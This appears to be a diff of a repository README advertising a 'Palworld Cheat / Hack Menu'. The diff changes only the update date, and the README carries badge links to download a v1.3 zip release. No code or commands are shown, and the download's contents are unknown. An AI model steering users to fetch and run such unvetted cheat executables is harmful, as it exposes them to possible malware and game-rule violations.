@@ -1,4 +1,4 @@
-# Palworld Cheat / Hack Menu (Upd: 19-08-26)
+# Palworld Cheat / Hack Menu (Upd: 22-08-26)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/yarnspearcrush/palworld-cheats/releases/download/v1.3/Palworld-1.3.0.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.3-blue?style=for-the-badge)](https://github.com/yarnspearcrush/palworld-cheats/releases/download/v1.3/Palworld-1.3.0.zip)
